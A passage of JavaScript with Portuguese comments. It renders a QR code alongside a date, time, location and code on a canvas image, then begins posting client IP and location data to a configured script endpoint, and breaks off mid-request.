  const canvas = document.createElement("canvas");
  canvas.width  = 500;
  canvas.height = 110;
  const ctx = canvas.getContext("2d");

  // Fundo branco
  ctx.fillStyle = "#ffffff";
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // QR local
  ctx.drawImage(qrCanvas, 0, 5, 100, 100);

  // Dados ao lado do QR
  const partes = dataHora.split(" ");
  const linhas = [
    "📅  " + (partes[0] || ""),
    "🕐  " + (partes[1] || ""),
    "📍  " + localizacao,
    "🔑  " + codigo
  ];
  ctx.font = "15px 'Courier New', monospace";
  ctx.fillStyle = "#222222";
  linhas.forEach((linha, i) => {
    ctx.fillText(linha, 112, 24 + i * 22);
  });

  return canvas.toDataURL("image/png");
}

      clienteIp:          geo.clienteIp || ""
    };

    console.log("Enviando dados - clienteIp:", dados.clienteIp, "localizacao:", dados.localizacaoCliente);

    fetch(SCRIPT_URL, {
      method:   "POST",
      redirect: "follow",
